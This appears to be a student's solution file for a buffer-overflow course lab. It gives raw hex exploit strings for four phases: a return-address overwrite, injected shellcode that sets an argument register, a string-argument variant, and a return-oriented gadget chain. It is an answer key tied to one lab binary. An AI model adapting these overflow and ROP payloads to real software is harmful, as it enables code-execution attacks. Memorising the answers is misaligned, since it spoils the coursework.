phase 1: 

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* the firstbytes are padding 000000000040156e */
6e 15 40 00 00 00 00 00

phase 2: 

48 c7 c7 6f 7c 6c 48 c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
98 c0 66 55 00 00 00 00
9c 15 40 00 00 00 00 00

phase 3:

48 c7 c7 c0 c0 66 55 c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
98 c0 66 55 00 00 00 00
b3 16 40 00 00 00 00 00
34 38 36 63 37 63 36 66

phase 4:

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
60 17 40 00 00 00 00 00
6f 7c 6c 48 00 00 00 00
77 17 40 00 00 00 00 00
9c 15 40 00 00 00 00 00
